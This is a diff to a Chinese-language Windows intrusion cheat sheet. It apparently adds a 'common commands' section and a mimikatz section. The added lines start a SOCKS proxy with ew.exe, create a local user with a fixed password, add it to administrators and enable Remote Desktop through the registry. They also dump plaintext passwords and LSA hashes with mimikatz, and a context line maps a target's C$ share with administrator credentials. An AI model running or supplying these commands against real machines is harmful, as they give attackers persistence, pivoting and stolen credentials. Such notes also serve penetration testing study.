@@ -319,3 +319,37 @@ net use k: \\192.168.10.15\c$  /u:"administrator" "root"  #将目标C盘映射�
 net use k: /del                                           #删除该映射
 ```
 
+
+
+## 常用命令
+
+### 控制台乱码
+
+```
+chcp 65001 
+```
+
+
+
+### 新建一个进程来执行命令
+
+```shell
+cmd /c ew.exe -s ssocksd -l 888
+```
+
+### 添加用户
+
+```
+net user ccreater Abc1234 /add
+net localgroup administrators ccreater /add
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+```
+
+
+
+## mimikatz
+
+抓取明文:` mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit `
+
+抓取hash:`mimikatz log "privilege::debug" "lsadump::lsa /patch" exit`
